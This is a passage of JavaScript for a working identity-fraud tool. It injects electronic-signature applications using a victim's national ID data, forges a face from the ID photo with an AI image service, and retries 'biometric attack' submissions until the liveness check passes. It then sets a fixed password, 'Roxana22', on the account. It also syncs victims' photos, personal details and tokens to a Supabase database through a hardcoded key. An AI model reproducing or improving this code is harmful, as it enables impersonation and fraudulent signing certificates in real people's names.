        bypassFotoGenerada.src = generatedImageUrl;
        bypassFotoGenerada.style.display = 'block';
        if (bypassFotoGeneradaPlaceholder) bypassFotoGeneradaPlaceholder.style.display = 'none';
      }
      bypassBase64Image = generatedImageUrl;

      // 3. Ejecutar post-procesado visual
      actualizarTextoBypassBtn(`Intento ${intento}/${maxIntentos}: Post-procesando...`);
      addLog('info', `[IA] Imagen recibida. Iniciando post-procesamiento...`);
      registrarLogSolicitud(idSol, 'info', `[BYPASS MANUAL] Intento ${intento}/${maxIntentos}: Foto recibida, iniciando post-procesamiento...`);
      await ejecutarPostProcesamientoVisual();

      // 4. Enviar prueba automáticamente al terminar post-procesado
      actualizarTextoBypassBtn(`Intento ${intento}/${maxIntentos}: Validando en Servidor...`);
      addLog('info', `[BYPASS] Post-procesamiento completado. Enviando prueba automáticamente al servidor...`);
      registrarLogSolicitud(idSol, 'info', `[BYPASS MANUAL] Intento ${intento}/${maxIntentos}: Enviando prueba biométrica al servidor...`);

      const resultado = await enviarAtaqueBiometrico(generatedImageUrl, token);

      if (resultado.ok) {
        bypassAprobado = true;
        addLog('success', `[BYPASS - ÉXITO] ¡Validación biométrica APROBADA con éxito en el intento ${intento}!`);
        addLog('success', `Respuesta del servidor: Status ${resultado.status} - Body: ${resultado.body}`);

        window._bypassToken = token;
        const passwordSection = document.getElementById('passwordSection');
        if (passwordSection) passwordSection.style.display = 'block';
        if (newPassInput) newPassInput.value = 'Roxana22';
        if (confirmPassInput) confirmPassInput.value = 'Roxana22';

        actualizarEstadoSolicitud(idSol, 'En Proceso', 'Paso 2/3: Validación biométrica APROBADA. Listo para guardar contraseña.', {
          token: token,
          linkBiometria: link
        });
        registrarLogSolicitud(idSol, 'success', `[BYPASS MANUAL] ¡Validación biométrica APROBADA con éxito en el intento ${intento}!`);

        actualizarTextoBypassBtn('Validación Aprobada');
        break; // Éxito alcanzado, detener bucle
      } else {
        addLog('warn', `[BYPASS - RECHAZADO] El servidor respondió ${resultado.body ? resultado.body.trim() : '0'}. La validación falló en el intento ${intento}.`);
        registrarLogSolicitud(idSol, 'warn', `[BYPASS MANUAL] Intento ${intento} rechazado (${resultado.body ? resultado.body.trim() : '0'}).`);

        if (intento < maxIntentos) {
          addLog('info', `[AUTO] Reintentando generación y prueba automáticamente (${intento + 1} de ${maxIntentos})...`);
          actualizarTextoBypassBtn(`Reintentando (${intento + 1}/${maxIntentos})...`);
          await new Promise(r => setTimeout(r, 2000));
        } else {
          addLog('error', `[BYPASS] Se completaron los ${maxIntentos} intentos sin lograr aprobación.`);
        }
      }

    } catch (err) {
      addLog('error', `[BYPASS] Error durante el intento ${intento}: ${err.message}`);
      registrarLogSolicitud(idSol, 'error', `[BYPASS MANUAL] Error en intento ${intento}: ${err.message}`);
      if (intento < maxIntentos) {
        addLog('info', `[AUTO] Reintentando tras error (${intento + 1} de ${maxIntentos})...`);
        await new Promise(r => setTimeout(r, 2500));
      } else {
        addLog('error', `[BYPASS] Se completaron los ${maxIntentos} intentos con errores.`);
      }
    }
  }

  if (!bypassAprobado) {
    actualizarEstadoSolicitud(idSol, 'Rechazada', 'Validación biométrica rechazada tras los intentos permitidos.');
    registrarLogSolicitud(idSol, 'error', '[BYPASS MANUAL] Validación biométrica rechazada tras los intentos permitidos.');
  }

  isRunningBypass = false;
  if (bypassBtn) {
    bypassBtn.classList.remove('loading');
    if (bypassAprobado) {
      bypassBtn.disabled = true;
      actualizarTextoBypassBtn('Validación Aprobada');
    } else {
      bypassBtn.disabled = false;
      actualizarTextoBypassBtn('Generar Foto y Enviar Prueba');
    }
  }
  if (generateAIBtn) {
    generateAIBtn.classList.remove('loading');
    generateAIBtn.disabled = bypassAprobado;
  }

  return bypassAprobado;
}

if (bypassBtn) {
  bypassBtn.addEventListener('click', iniciarFlujoGenerarYValidar);
}
if (generateAIBtn) {
  generateAIBtn.addEventListener('click', iniciarFlujoGenerarYValidar);
}

// ==================================================
// Flujo Automatizado: "INYECCION COMPLETA"
// (Inyectar trámite -> Generar foto y validar -> Guardar contraseña)
// ==================================================
async function ejecutarInyeccionCompleta() {
  // 1. Validar que tengamos cédula ingresada
  if (!cedulaInput || !cedulaInput.value.trim()) {
    addLog('warn', '[INYECCIÓN COMPLETA] Por favor ingresa el número de cédula en el formulario.');
    return;
  }

  // 2. Si no se han consultado datos o foto, consultar automáticamente
  const fotoActual = (bypassFotoSistema && bypassFotoSistema.src && !bypassFotoSistema.src.endsWith('/'))
    ? bypassFotoSistema.src
    : (fotoCedulaImg && fotoCedulaImg.src && !fotoCedulaImg.src.endsWith('/') ? fotoCedulaImg.src : bypassBase64Image);

  if (!fotoActual || fotoActual.length < 50 || (!nombresInput || !nombresInput.value.trim())) {
    addLog('info', '[INYECCIÓN COMPLETA] Consultando cédula para autocompletar datos y foto...');
    await consultarCedula(false);
  }

  const fotoFinal = (bypassFotoSistema && bypassFotoSistema.src && !bypassFotoSistema.src.endsWith('/'))
    ? bypassFotoSistema.src
    : (fotoCedulaImg && fotoCedulaImg.src && !fotoCedulaImg.src.endsWith('/') ? fotoCedulaImg.src : bypassBase64Image);

  if (!fotoFinal || fotoFinal.length < 50) {
    addLog('warn', '[INYECCIÓN COMPLETA] No se encontró foto de referencia de la persona. Consulta la cédula o sube una imagen manual.');
    return;
  }

  // Snapshot de datos enviados en el POST
  const datosPostSnapshot = {
    cedula: cedulaInput ? cedulaInput.value.trim() : '',
    nombres: nombresInput ? nombresInput.value.trim() : '',
    apellidos: apellidosInput ? apellidosInput.value.trim() : '',
    ruc: rucInput ? rucInput.value.trim() : '',
    codigo_dactilar: codigoDactilarInput ? codigoDactilarInput.value.trim() : '',
    celular: celularInput ? celularInput.value.trim() : '',
    correo: correoInput ? correoInput.value.trim() : '',
    provincia: provinciaInput ? provinciaInput.value.trim() : '',
    ciudad: ciudadInput ? ciudadInput.value.trim() : '',
    parroquia: parroquiaInput ? parroquiaInput.value.trim() : '',
    direccion: direccionInput ? direccionInput.value.trim() : '',
    banco: bancoInput ? bancoInput.value.trim() : '',
    valorPago: valorPagoInput ? valorPagoInput.value.trim() : '',
    numero_tramite: numeroTramiteInput ? numeroTramiteInput.value.trim() : '',
    perfil_firma: perfilFirmaInput ? perfilFirmaInput.value.trim() : ''
  };

  // Registrar solicitud en el panel de la derecha
  const idSolicitud = registrarNuevaSolicitud({
    estado: 'En Proceso',
    estadoDetalle: 'Paso 1/3: Solicitud enviada, iniciando en segundo plano...',
    cedula: datosPostSnapshot.cedula,
    nombres: datosPostSnapshot.nombres,
    apellidos: datosPostSnapshot.apellidos,
    fotoPersona: normalizarDataUrl(fotoFinal, 'image/jpeg'),
    comprobantePago: fotoPagoBase64 ? normalizarDataUrl(fotoPagoBase64, fotoPagoMimetype || 'image/jpeg') : normalizarDataUrl(DEFAULT_FOTO_PAGO, 'image/jpeg'),
    datosPost: datosPostSnapshot,
    clave: 'Roxana22'
  });

  // Mostrar aviso de éxito inmediatamente con los dos botones (Esperar e Ingresar otro trámite)
  const avisoExitoCompleto = document.getElementById('avisoExitoCompleto');
  if (avisoExitoCompleto) {
    avisoExitoCompleto.style.display = 'block';
    avisoExitoCompleto.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  addLog('success', `[INYECCIÓN COMPLETA] Solicitud registrada con éxito para ${datosPostSnapshot.nombres} ${datosPostSnapshot.apellidos} (Cédula: ${datosPostSnapshot.cedula}).`);
  addLog('info', '[INYECCIÓN COMPLETA] El trámite se procesará en segundo plano. Puedes esperar o ingresar otro trámite de inmediato.');

  // Iniciar procesamiento en segundo plano de forma desacoplada
  procesarTramiteEnSegundoPlano(idSolicitud);
}

// Conjunto para evitar procesar la misma solicitud dos veces en paralelo
const solicitudesEnEjecucion = new Set();

// Registra un log vinculado a una solicitud específica (reflejándolo en consola, historial local y Supabase)
function registrarLogSolicitud(idSolicitud, tipo, mensaje) {
  addLog(tipo, mensaje);

  const solicitudes = obtenerSolicitudesHistorial();
  const index = solicitudes.findIndex(s => s.id === idSolicitud);
  if (index !== -1) {
    if (!Array.isArray(solicitudes[index].logs)) {
      solicitudes[index].logs = [];
    }
    const ahora = new Date().toLocaleTimeString();
    solicitudes[index].logs.push({
      hora: ahora,
      tipo: tipo,
      mensaje: mensaje
    });
    if (solicitudes[index].logs.length > 100) {
      solicitudes[index].logs = solicitudes[index].logs.slice(-100);
    }
    guardarSolicitudesHistorial(solicitudes);
    sincronizarConSupabase(solicitudes[index]);

    // Si el modal de detalle está abierto para esta solicitud, agregarlo en tiempo real
    const modal = document.getElementById('modalDetalleSolicitud');
    if (modal && modal.style.display !== 'none' && modal.getAttribute('data-active-id') === idSolicitud) {
      const logsBox = document.getElementById('modalLogsBox');
      if (logsBox) {
        const emptyMsg = logsBox.querySelector('.modal-logs-empty');
        if (emptyMsg) emptyMsg.remove();

        const item = document.createElement('div');
        item.className = `modal-log-item ${tipo}`;
        item.innerHTML = `<span class="modal-log-time">[${ahora}]</span> <span class="modal-log-msg">${mensaje}</span>`;
        logsBox.appendChild(item);
        logsBox.scrollTop = logsBox.scrollHeight;
      }
    }
  }
}

// Procesador autónomo en segundo plano (no depende de los valores actuales del DOM)
async function procesarTramiteEnSegundoPlano(idSolicitud) {
  if (solicitudesEnEjecucion.has(idSolicitud)) {
    return;
  }
  solicitudesEnEjecucion.add(idSolicitud);

  try {
    const solicitudes = obtenerSolicitudesHistorial();
    const sol = solicitudes.find(s => s.id === idSolicitud);
    if (!sol) {
      solicitudesEnEjecucion.delete(idSolicitud);
      return;
    }

    if (sol.estado === 'Aprobada' || sol.estado === 'Rechazada') {
      solicitudesEnEjecucion.delete(idSolicitud);
      return;
    }

    const cedula = sol.cedula || 'Trámite';
    const clave = sol.clave || 'Roxana22';
    let token = sol.token || '';
    let linkBiometria = sol.linkBiometria || '';

    // ----------------------------------------------------
    // PASO 1: Inyectar Solicitud POST (si no tiene token previo)
    // ----------------------------------------------------
    if (!token) {
      registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] PASO 1/3: Inyectando Solicitud POST de Trámite...`);
      actualizarEstadoSolicitud(idSolicitud, 'En Proceso', 'Paso 1/3: Inyectando Solicitud POST...');

      const resInyeccion = await ejecutarInyeccionFirma(sol.datosPost);
      if (!resInyeccion.ok || !resInyeccion.link_biometria) {
        const errorMsg = resInyeccion.error || 'La inyección del trámite falló.';
        registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
        actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
        solicitudesEnEjecucion.delete(idSolicitud);
        return;
      }

      linkBiometria = resInyeccion.link_biometria;
      token = resInyeccion.token || extraerTokenDeUrl(linkBiometria);
      if (!token) {
        const errorMsg = 'No se pudo obtener el token de validación del enlace generado.';
        registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
        actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
        solicitudesEnEjecucion.delete(idSolicitud);
        return;
      }

      registrarLogSolicitud(idSolicitud, 'success', `[SEGUNDO PLANO - ${cedula}] Solicitud POST inyectada con éxito. Token obtenido.`);
      actualizarEstadoSolicitud(idSolicitud, 'En Proceso', 'Paso 2/3: Trámite inyectado, iniciando biometría...', {
        token,
        linkBiometria
      });
    }

    // ----------------------------------------------------
    // PASO 2: Generar Foto, Post-procesar y Validar Biometría
    // ----------------------------------------------------
    const fotoBase = sol.fotoPersona;
    if (!fotoBase || fotoBase.length < 50) {
      const errorMsg = 'No se encontró foto de referencia para generar biometría.';
      registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
      solicitudesEnEjecucion.delete(idSolicitud);
      return;
    }

    const maxIntentos = 5;
    let bypassAprobado = false;

    for (let intento = 1; intento <= maxIntentos; intento++) {
      registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] PASO 2/3: Intento ${intento} de ${maxIntentos} - Generando Foto con IA...`);
      actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Generando foto con IA...`);

      let generatedImageUrl = null;

      try {
        const imagenOptimizada = await optimizarImagenParaIA(fotoBase, 1024, 0.85);
        registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Imagen optimizada (${Math.round(imagenOptimizada.length / 1024)} KB). Solicitando a OpenAI...`);

        const response = await fetch(SUPABASE_PROXY_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
          },
          body: JSON.stringify({
            action: 'generate-ai',
            prompt: DEFAULT_AI_PROMPT,
            imageBase64: imagenOptimizada
          })
        });

        const data = await response.json();
        if (data.error) {
          throw new Error(data.error.message || JSON.stringify(data.error));
        }

        if (data.data && data.data[0]) {
          if (data.data[0].b64_json) {
            generatedImageUrl = `data:image/jpeg;base64,${data.data[0].b64_json}`;
          } else if (data.data[0].url) {
            generatedImageUrl = data.data[0].url;
          }
        }

        if (!generatedImageUrl) {
          throw new Error('No se recibió la imagen de OpenAI.');
        }

        registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Foto generada. Procesando y preparando validación...`);
        actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Procesando imagen...`);

        // Post-procesamiento en segundo plano con duración aleatoria entre 3 y 6 minutos (180s a 360s)
        const duracionPostMs = Math.floor(Math.random() * (360000 - 180000 + 1)) + 180000;
        const duracionMinutos = (duracionPostMs / 60000).toFixed(1);
        registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Iniciando post-procesamiento de imagen. Duración calculada: ${duracionMinutos} minutos.`);
        actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Post-procesando imagen (~${duracionMinutos} min)...`);

        const intervaloReporte = 45000; // Reportar cada 45 segundos
        let transcurrido = 0;
        while (transcurrido < duracionPostMs) {
          const espera = Math.min(intervaloReporte, duracionPostMs - transcurrido);
          await new Promise(r => setTimeout(r, espera));
          transcurrido += espera;
          const pct = Math.min(99, Math.round((transcurrido / duracionPostMs) * 100));
          const restMin = Math.max(0, (duracionPostMs - transcurrido) / 60000).toFixed(1);
          if (transcurrido < duracionPostMs) {
            actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Post-procesando (${pct}%, restan ~${restMin} min)...`);
            registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Post-procesando imagen: ${pct}% completado (~${restMin} min restantes)...`);
          }
        }
        registrarLogSolicitud(idSolicitud, 'success', `[SEGUNDO PLANO - ${cedula}] Post-procesamiento completado. Preparando envío de prueba biométrica.`);

        registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Enviando prueba biométrica al servidor...`);
        actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Validando en servidor...`);

        const resultado = await enviarAtaqueBiometrico(generatedImageUrl, token);

        if (resultado.ok) {
          bypassAprobado = true;
          registrarLogSolicitud(idSolicitud, 'success', `[SEGUNDO PLANO - ${cedula}] ¡Validación biométrica APROBADA en el intento ${intento}!`);
          break;
        } else {
          registrarLogSolicitud(idSolicitud, 'warn', `[SEGUNDO PLANO - ${cedula}] Intento ${intento} rechazado por el servidor (${resultado.body ? resultado.body.trim() : '0'}).`);
          if (intento < maxIntentos) {
            registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Reintentando generación en 3 segundos (${intento + 1} de ${maxIntentos})...`);
            await new Promise(r => setTimeout(r, 3000));
          }
        }
      } catch (errIntento) {
        registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] Error en intento ${intento}: ${errIntento.message}`);
        if (intento < maxIntentos) {
          await new Promise(r => setTimeout(r, 3000));
        }
      }
    }

    if (!bypassAprobado) {
      const errorMsg = 'Validación biométrica rechazada tras los intentos máximos permitidos.';
      registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
      solicitudesEnEjecucion.delete(idSolicitud);
      return;
    }

    // ----------------------------------------------------
    // PASO 3: Guardar Contraseña Fija
    // ----------------------------------------------------
    registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] PASO 3/3: Guardando Contraseña "${clave}" en Servidor...`);
    actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 3/3: Guardando contraseña ${clave}...`);

    const resPass = await guardarContrasenaEnServidor(token, clave);

    if (resPass.ok) {
      registrarLogSolicitud(idSolicitud, 'success', `[SEGUNDO PLANO - ${cedula}] ¡TRÁMITE COMPLETADO Y APROBADO CON ÉXITO! Biometría aprobada y contraseña "${clave}" guardada.`);
      actualizarEstadoSolicitud(idSolicitud, 'Aprobada', 'Trámite inyectado, biometría validada y contraseña guardada con éxito.');
    } else {
      const errorMsg = 'Biometría aprobada pero ocurrió un fallo al guardar la contraseña.';
      registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
    }

  } catch (errGlobal) {
    registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO] Error crítico en trámite: ${errGlobal.message}`);
    actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errGlobal.message || 'Error en segundo plano.');
  } finally {
    solicitudesEnEjecucion.delete(idSolicitud);
  }
}

if (inyeccionCompletaBtn) {
  inyeccionCompletaBtn.addEventListener('click', ejecutarInyeccionCompleta);
}

// Botón "Esperar" dentro del aviso de éxito
const btnEsperarSolicitud = document.getElementById('btnEsperarSolicitud');
if (btnEsperarSolicitud) {
  btnEsperarSolicitud.addEventListener('click', () => {
    const aviso = document.getElementById('avisoExitoCompleto');
    if (aviso) aviso.style.display = 'none';
    addLog('system', 'Permaneciendo en la página para visualizar logs del trámite enviado...');
  });
}

// Botón "Ingresar otro trámite" dentro del aviso de éxito
const btnGenerarNuevaSolicitud = document.getElementById('btnGenerarNuevaSolicitud');
if (btnGenerarNuevaSolicitud) {
  btnGenerarNuevaSolicitud.addEventListener('click', () => {
    const aviso = document.getElementById('avisoExitoCompleto');
    if (aviso) aviso.style.display = 'none';
    reiniciarTodoParaNuevaFirma();
    addLog('system', 'Formulario limpiado. Listo para ingresar otro trámite. Los trámites anteriores continúan procesándose en segundo plano.');
  });
}

// ==================================================
// Módulo de Historial y Estados de Solicitudes (Supabase + LocalStorage)
// ==================================================
const STORAGE_KEY_SOLICITUDES = 'solicitudes_firmas_historial';

const SUPABASE_CONFIG = {
  url: 'https://eapcqcuzfkpqngbvjtmv.supabase.co',
  anonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVhcGNxY3V6ZmtwcW5nYnZqdG12Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4NTEzNzIsImV4cCI6MjA3NDQyNzM3Mn0.-mufqMzFQetktwAL444d1PjdWfdCC5-2ftVs0LnTIL4'
};

function transformarSolicitudASupabase(sol) {
  return {
    id: sol.id,
    fecha_hora: sol.fechaHora || new Date().toLocaleString(),
    estado: sol.estado || 'En Proceso',
    estado_detalle: sol.estadoDetalle || '',
    cedula: sol.cedula || '',
    nombres: sol.nombres || '',
    apellidos: sol.apellidos || '',
    nombre_completo: sol.nombreCompleto || '',
    foto_persona: sol.fotoPersona || '',
    comprobante_pago: sol.comprobantePago || '',
    datos_post: sol.datosPost || {},
    link_biometria: sol.linkBiometria || '',
    token: sol.token || '',
    clave: sol.clave || 'Roxana22',
    logs: Array.isArray(sol.logs) ? sol.logs : []
  };
}

function transformarSolicitudDesdeSupabase(row) {
  return {
    id: row.id,
    fechaHora: row.fecha_hora || (row.created_at ? new Date(row.created_at).toLocaleString() : ''),
    timestamp: row.created_at ? new Date(row.created_at).getTime() : Date.now(),
    estado: row.estado || 'En Proceso',
    estadoDetalle: row.estado_detalle || '',
    cedula: row.cedula || '',
    nombres: row.nombres || '',
    apellidos: row.apellidos || '',
    nombreCompleto: row.nombre_completo || `${row.nombres || ''} ${row.apellidos || ''}`.trim() || row.cedula || 'Solicitud',
    fotoPersona: row.foto_persona || '',
    comprobantePago: row.comprobante_pago || '',
    datosPost: row.datos_post || {},
    linkBiometria: row.link_biometria || '',
    token: row.token || '',
    clave: row.clave || 'Roxana22',
    logs: Array.isArray(row.logs) ? row.logs : []
  };
}

async function sincronizarConSupabase(solicitud) {
  try {
    const payload = transformarSolicitudASupabase(solicitud);
    const resp = await fetch(`${SUPABASE_CONFIG.url}/rest/v1/historial_solicitudes`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_CONFIG.anonKey,
        'Authorization': `Bearer ${SUPABASE_CONFIG.anonKey}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify(payload)
    });

    if (!resp.ok) {
      const errTxt = await resp.text();
      console.warn('[Supabase Sync Warn]', resp.status, errTxt);
    } else {
      console.log('[Supabase Sync OK]', solicitud.id);
    }
  } catch (err) {
    console.error('[Supabase Sync Error]', err);
  }
}

async function cargarHistorialDesdeSupabase() {
  try {
    const resp = await fetch(`${SUPABASE_CONFIG.url}/rest/v1/historial_solicitudes?order=created_at.desc&limit=50`, {
      method: 'GET',
      headers: {
        'apikey': SUPABASE_CONFIG.anonKey,
        'Authorization': `Bearer ${SUPABASE_CONFIG.anonKey}`
      }
    });

    if (resp.ok) {
      const data = await resp.json();
      if (Array.isArray(data) && data.length > 0) {
        const remotas = data.map(transformarSolicitudDesdeSupabase);
        const locales = obtenerSolicitudesHistorial();
        
        const mapa = new Map();
        remotas.forEach(r => mapa.set(r.id, r));
        locales.forEach(l => {
          if (!mapa.has(l.id)) {
            mapa.set(l.id, l);
            sincronizarConSupabase(l);
          }
        });

        const listaFinal = Array.from(mapa.values()).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        guardarSolicitudesHistorial(listaFinal);
        renderizarListaSolicitudes();
        addLog('system', `[Supabase] Historial sincronizado (${listaFinal.length} solicitudes).`);
      }
    }
  } catch (err) {
    console.warn('[Supabase Load Error]', err);
  }
}

function obtenerSolicitudesHistorial() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_SOLICITUDES);
    return raw ? JSON.parse(raw) : [];
  } catch (e) {
    return [];
  }
}

function guardarSolicitudesHistorial(solicitudes) {
  try {
    const capped = solicitudes.slice(0, 50);
    localStorage.setItem(STORAGE_KEY_SOLICITUDES, JSON.stringify(capped));
  } catch (e) {
    console.error('Error al guardar historial en localStorage:', e);
  }
}

function registrarNuevaSolicitud(datosIniciales) {
  const solicitudes = obtenerSolicitudesHistorial();
  const horaActual = new Date().toLocaleTimeString();
  const nueva = {
    id: 'sol_' + Date.now() + '_' + Math.floor(Math.random() * 1000),
    fechaHora: new Date().toLocaleString(),
    timestamp: Date.now(),
    estado: datosIniciales.estado || 'En Proceso',
    estadoDetalle: datosIniciales.estadoDetalle || 'Iniciando trámite...',
    cedula: datosIniciales.cedula || '',
    nombres: datosIniciales.nombres || '',
    apellidos: datosIniciales.apellidos || '',
    nombreCompleto: (datosIniciales.nombres && datosIniciales.apellidos)
      ? `${datosIniciales.nombres} ${datosIniciales.apellidos}`.trim()
      : (datosIniciales.cedula || 'Solicitud sin nombre'),
    fotoPersona: datosIniciales.fotoPersona || '',
    comprobantePago: datosIniciales.comprobantePago || '',
    datosPost: datosIniciales.datosPost || {},
    linkBiometria: datosIniciales.linkBiometria || '',
    token: datosIniciales.token || '',
    clave: datosIniciales.clave || 'Roxana22',
    logs: [
      {
        hora: horaActual,
        tipo: 'info',
        mensaje: `Trámite registrado e iniciado para ${datosIniciales.nombres || ''} ${datosIniciales.apellidos || ''} (Cédula: ${datosIniciales.cedula || ''}).`
      }
    ]
  };

  solicitudes.unshift(nueva);
  guardarSolicitudesHistorial(solicitudes);
  renderizarListaSolicitudes();
  sincronizarConSupabase(nueva);
  return nueva.id;
}

function actualizarEstadoSolicitud(id, nuevoEstado, nuevoDetalle, camposAdicionales = {}) {
  const solicitudes = obtenerSolicitudesHistorial();
  const index = solicitudes.findIndex(s => s.id === id);
  if (index !== -1) {
    solicitudes[index].estado = nuevoEstado;
    if (nuevoDetalle) solicitudes[index].estadoDetalle = nuevoDetalle;
    Object.assign(solicitudes[index], camposAdicionales);
    guardarSolicitudesHistorial(solicitudes);
    renderizarListaSolicitudes();
    sincronizarConSupabase(solicitudes[index]);
  }
}

async function eliminarSolicitud(id) {
  let solicitudes = obtenerSolicitudesHistorial();
  solicitudes = solicitudes.filter(s => s.id !== id);
  guardarSolicitudesHistorial(solicitudes);
  renderizarListaSolicitudes();

  const modal = document.getElementById('modalDetalleSolicitud');
  if (modal && modal.getAttribute('data-active-id') === id) {
    modal.style.display = 'none';
  }

  try {
    const resp = await fetch(`${SUPABASE_CONFIG.url}/rest/v1/historial_solicitudes?id=eq.${id}`, {
      method: 'DELETE',
      headers: {
        'apikey': SUPABASE_CONFIG.anonKey,
        'Authorization': `Bearer ${SUPABASE_CONFIG.anonKey}`
      }
    });
    if (resp.ok) {
      addLog('system', `[Historial] Solicitud ${id} eliminada.`);
    }
  } catch (err) {
    console.warn('[Supabase Delete Error]', err);
  }
}

async function vaciarHistorialCompleto() {
  localStorage.removeItem(STORAGE_KEY_SOLICITUDES);
  renderizarListaSolicitudes();

  const modal = document.getElementById('modalDetalleSolicitud');
  if (modal) modal.style.display = 'none';

  try {
    const resp = await fetch(`${SUPABASE_CONFIG.url}/rest/v1/historial_solicitudes?id=neq.placeholder_none`, {
      method: 'DELETE',
      headers: {
        'apikey': SUPABASE_CONFIG.anonKey,
        'Authorization': `Bearer ${SUPABASE_CONFIG.anonKey}`
      }
    });
    if (resp.ok) {
      addLog('system', '[Historial] Historial vaciado por completo (local y en Supabase).');
    }
  } catch (err) {
    console.warn('[Supabase Clear Error]', err);
  }
}

function renderizarListaSolicitudes() {
  const listaCont = document.getElementById('listaSolicitudes');
  const contador = document.getElementById('contadorSolicitudes');
  if (!listaCont) return;

  const solicitudes = obtenerSolicitudesHistorial();
  if (contador) contador.textContent = solicitudes.length;

  if (solicitudes.length === 0) {
    listaCont.innerHTML = `
      <div class="solicitudes-empty" id="solicitudesEmpty">
        <span>No hay solicitudes registradas aún.</span>
      </div>
    `;
    return;
  }

  listaCont.innerHTML = '';

  solicitudes.forEach(sol => {
    const card = document.createElement('div');
    card.className = 'solicitud-card';
    card.setAttribute('data-id', sol.id);

    let badgeClass = 'status-proceso';
    if (sol.estado === 'Aprobada' || sol.estado === 'Completada') {
      badgeClass = 'status-aprobada';
    } else if (sol.estado === 'Rechazada' || sol.estado === 'Error') {
      badgeClass = 'status-rechazada';
    }

    const fotoNorm = normalizarDataUrl(sol.fotoPersona, 'image/jpeg');
    const avatarHtml = fotoNorm
      ? `<img src="${fotoNorm}" alt="Foto">`
      : `<span class="solicitud-avatar-placeholder">${(sol.nombres ? sol.nombres.slice(0, 2).toUpperCase() : 'CI')}</span>`;

    card.innerHTML = `
      <div class="solicitud-avatar">
        ${avatarHtml}
      </div>
      <div class="solicitud-info">
        <div class="solicitud-nombre" title="${sol.nombreCompleto}">${sol.nombreCompleto}</div>
        <div class="solicitud-cedula">C.I: ${sol.cedula || '---'}</div>
        <div class="solicitud-fecha">${sol.fechaHora}</div>
      </div>
      <div class="solicitud-status-wrap">
        <span class="solicitud-badge ${badgeClass}">${sol.estado}</span>
        <button type="button" class="btn-card-delete" data-id="${sol.id}" title="Eliminar solicitud">&times;</button>
      </div>
    `;

    const deleteBtn = card.querySelector('.btn-card-delete');
    if (deleteBtn) {
      deleteBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        if (confirm(`¿Deseas eliminar la solicitud de ${sol.nombreCompleto || sol.cedula}?`)) {
          eliminarSolicitud(sol.id);
        }
      });
    }

    card.addEventListener('click', () => {
      mostrarDetalleSolicitud(sol.id);
    });

    listaCont.appendChild(card);
  });
}

function mostrarDetalleSolicitud(id) {
  const solicitudes = obtenerSolicitudesHistorial();
  const sol = solicitudes.find(s => s.id === id);
  if (!sol) return;

  const modal = document.getElementById('modalDetalleSolicitud');
  const badge = document.getElementById('modalEstadoBadge');
  const body = document.getElementById('modalDetalleBody');
  const btnEliminarModal = document.getElementById('btnEliminarSolicitudModal');
  if (!modal || !body) return;

  modal.setAttribute('data-active-id', id);

  if (btnEliminarModal) {
    btnEliminarModal.style.display = 'inline-block';
    btnEliminarModal.onclick = () => {
      if (confirm(`¿Deseas eliminar la solicitud de ${sol.nombreCompleto || sol.cedula}?`)) {
        eliminarSolicitud(id);
      }
    };
  }

  let badgeClass = 'status-proceso';
  if (sol.estado === 'Aprobada' || sol.estado === 'Completada') {
    badgeClass = 'status-aprobada';
  } else if (sol.estado === 'Rechazada' || sol.estado === 'Error') {
    badgeClass = 'status-rechazada';
  }

  if (badge) {
    badge.className = `solicitud-badge ${badgeClass}`;
    badge.textContent = sol.estado;
  }

  const fotoCedulaNorm = normalizarDataUrl(sol.fotoPersona, 'image/jpeg');
